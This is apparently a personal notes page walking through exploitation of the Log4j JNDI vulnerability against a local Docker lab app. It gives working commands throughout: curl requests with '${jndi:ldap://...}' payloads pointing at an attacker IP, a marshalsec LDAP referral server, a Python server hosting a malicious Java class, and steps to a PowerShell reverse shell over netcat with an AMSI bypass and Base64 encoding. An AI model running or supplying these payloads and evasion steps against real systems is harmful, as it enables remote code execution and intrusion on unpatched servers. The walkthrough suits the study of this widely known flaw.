# Log4j Vulnerability

## Sources

* [Java - Apache Log4j 2 Library](https://logging.apache.org/log4j/2.x/)
* [John Hammond Log4j Proof Of Concept Video](https://www.youtube.com/watch?v=7qoPDq41xhQ&t=1481s)
* [`leonjza` Github Repository - Log4j POC](https://github.com/leonjza/log4jpwn)
* [`xiajun325` Github Repository - Log4j POC](https://github.com/xiajun325/apache-log4j-rce-poc)
* [Github - Powershell Reverse Shell](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)

## Initial Log4j POC

Creating vulnerable Java application on a Docker container :
```
git clone https://github.com/leonjza/log4jpwn
cd log4jpwn
sudo docker build -t log4jpwn .
sudo docker run --rm -p8080:8080 log4jpwn
```

Create `netcat` connection to see the result of the request :
```
nc -lnvp 3333
```

Send poisonned request to server :
```
curl -H 'User-Agent: ${jndi:ldap://172.28.42.128:3333/a}' localhost:8080
```

The IP address of the malicious server is `172.28.42.128`.  
The vulnerable Java application connects to the `netcat` listener (`172.28.42.128:3333`).

## Remote code execution

Create LDAP server (require Java 8) :
```
git clone https://github.com/mbechler/marshalsec
cd marshalsec
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:5555/#Log4j"
```

Compile `Log4j.java` file :
```
javac Log4j.java
```

Create HTTP server with Python in the directory that store `Log4j.class` file :
```
python3 -m http.server 5555
```

Keep the previous vulnerable Java application alive :
```
sudo docker run --rm -p8080:8080 log4jpwn
```

Send poisonned request to server :
```
curl -H 'User-Agent: ${jndi:ldap://172.28.42.128:1389/Log4j}' localhost:8080
```

Once the `curl` request is recieved, the target will connect to the LDAP server and run the `Log4j` Java class file.

## Reverse shell

Create `netcat` connection to receive the access to the reverse shell :
```
nc -lnvp 3333
```

Get [this](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3) Powershell script and edit the IP address and the port to match with the target.

Then, go on [AMSI.fail](https://amsi.fail/) wbesite and copy a `Rasta-mouses Amsi-Scan-Buffer patch`. Encode the previous Rasta-mouses patch followed by the Powershell script into Base64 thanks to a [Powershell encoder](https://raikia.com/tool-powershell-encoder).

Adapt the code in `Log4j.java` file to run the corresponding command then compile :
```
javac Log4j.java
```

With the LDAP server running, start JNDI injection to the target to establish a reverse shell connection through `netcat`.